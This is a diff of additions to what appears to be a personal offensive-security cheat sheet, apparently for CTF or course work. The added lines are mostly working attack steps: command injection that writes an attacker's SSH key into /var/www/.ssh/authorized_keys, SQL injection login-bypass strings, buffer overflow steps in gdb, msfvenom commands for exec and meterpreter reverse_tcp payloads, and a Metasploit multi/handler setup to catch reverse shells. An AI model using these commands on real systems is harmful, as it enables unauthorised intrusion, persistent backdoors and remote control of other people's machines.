@@ -35,7 +35,18 @@ WEB EXPLOITATION / SQL
     ?selection=2 or 1=1;
     
   UPON DISCOVERY OF CREDENTIALS ATTEMPT BASE64, HEX, ROT-13 CONVERSIONS VIA CYBERCHEF IF NEEDED!!!
-  
+----------
+CMD INJECTION:
+ONCE CMD INJECTION POSSIBILITY VERIFIED IN VULNERABLE FORM (USE ; <CMD> FORMAT):
+ON LIN-OPS EQUIVALENT: ssh-keygen -t rsa -b 4096
+UPLOAD RESULTING id_rsa.pub FILE:
+  cat id_rsa.pub, COPY CONTENTS TO CLIPBOARD
+ON VULNERABLE FIELD ON PAGE AGAIN:
+; mkdir /var/www/.ssh 
+VERIFY CMD WITH ls -la
+; ls -la /var/www/.ssh
+; echo "CONTENTS OF YOUR id_rsa.pub FILE" > /var/www/.ssh/authorized_keys
+VERIFY CMD WITH ls -la
 ----------
 METHODOLOGY: 
 WHEN DISCOVER IP OF INTEREST:
@@ -46,6 +57,16 @@ WHEN DISCOVER INPUT FIELD ON WEBSITE:
   - TO DISPLAY WHAT WAS SENT IN INPUT FIELD AFTER SUBMISSION: F12 -> NEWTWORK, REQUEST, ENABLE RAW, AFTER THIS: ADD "?" TO URL AFTER .php, THEN PASTE FINDINGS FROM THE REQUEST
   - OR TRY IN URL: ?username=tom' OR 1='1 & passwd=tom' OR 1='1
 !!!ON WINDOWS INITIAL LOGIN, LOOK AT SERVICES, SCHEDULED TASKS, REGISTRY LOCATIONS RELEVANT TO PERSISTENCE!!!
+GATOR BOYS EXAMPLE FOR BUFFER OVERFLOW:
+  ./func <<< $(echo "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"), ./func $(echo AAAAAAAAAAAAAAAAAAAAAAAAAA) 
+  CHECK IF GDB INSTALLED TO DETERMINE IF GDB USAGE EVEN REQUIRED!!!
+  gdb
+  pdisas main
+  pdisas getuserinput
+  wiremask -> BUFFER OVERFLOW PATTERN GENERATOR!!! THEN USER GATOR BOYS!!!
+  env - gdb ./func
+  msfvenom -p linux/x86/exec CMD=<ONE CMD TO EXECUTE, PUT IN SINGLE QUOTES WITH && IN MIDDLE TO EXECUTE MULTIPLE'
+  msfvenom -p linux/x96/meterpreter/reverse_tcp LHOST="ME" LPORT=4444 -b '\x00' -f python 
 ------------------------------------------------------------------------------------------------------------------------
 SCRIPTS 
 mybuff.py
@@ -82,6 +103,17 @@ buf += b"\x9c\xad\x0f\xdb\x0d\xa4\xf1\x2e\x31"
 
 print(buf)
 ---------------
+!!!BANNER GRAB RELEVANT PORT FIRST!!!
+MULTIHANDLER STEPS:
+msfconsole
+use multi/handler
+show options
+set payload windows/meterpreter/reverse_tcp
+set LHOST 0.0.0.0
+show options
+run
+THEN USE SCRIPT BELOW!
+---
 secureServerBuffo.py
 #!/usr/bin/python2.7
 
